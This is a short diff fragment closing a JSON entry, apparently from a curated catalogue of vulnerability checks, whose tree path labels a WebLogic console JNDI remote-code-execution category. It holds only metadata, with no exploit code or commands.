+    },
+    "source": "curated",
+    "treePath": "middleware/rce/middleware-rce-weblogic-console-jndi"
+  }
+]
